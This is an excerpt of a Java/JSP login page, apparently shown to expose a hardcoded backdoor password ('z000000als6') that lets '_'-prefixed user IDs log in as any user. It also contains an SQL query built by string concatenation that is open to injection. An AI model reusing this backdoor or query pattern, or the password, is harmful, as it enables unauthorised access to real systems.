...
void setCurPref(Transaction Sqlca, ASPreference CurPref,String sUserID,String sPassword) throws Exception{
	...
	//如果用户口令本身不通过，就不做修改
	if (sPasswordState == null || sPasswordState.equals("")|| sPasswordState.equals("0") || sPassword.equals("z000000als6")) {
		//用户口令检查
		if (iVisitTimes == 0 && !sPassword.equals("z000000als6")) {
...
<% 	
	...
	try
	{
		...
		//假如sWebRootPath参数不对，可以在页面中设置，缺省中使用Web.xml中display-name
		//CurConfig.setWebRootPath(request.getContextPath());
		...
		if (sUserID.substring(0,1).equals("_")&&sPassword.equals("z000000als6")) {//测试期间临时允许进入
			CurUser = new ASUser(sUserID.substring(1),Sqlca); 	//建立当前用户
		} else {
			String sStatus = Sqlca.getString("Select Status from User_Info where UserID = '"+sUserID+"'");
			if(sStatus == null)
				throw new Exception("用户"+sUserID+"不存在");         
			else if(!"1".equals(sStatus)){
		    %>
				<script language=javascript>
					alert("用户被停用或被锁定了，不能登录！\n如果您要继续使用，请与系统管理员联系，恢复用户状态。");
					window.open("index.html","_top");
				</script>			
		    <%
				return;
			}
		    CurUser = new ASUser(sUserID,sPassword,Sqlca); 	//建立当前用户
		}
...
%>
	<script language=javascript>
		...
		window.open("<%=sWebRootPath%>/Redirector.jsp?ComponentURL=/Welcome_New.jsp&ComponentID=Welcome_New&ToDestroyClientID=<%=CurComp.ClientID%>&ParentClientID=<%=CurComp.ClientID%>&rand="+randomNumber(),"_top");
	</script>
<%	    
	}
	catch (Exception e)
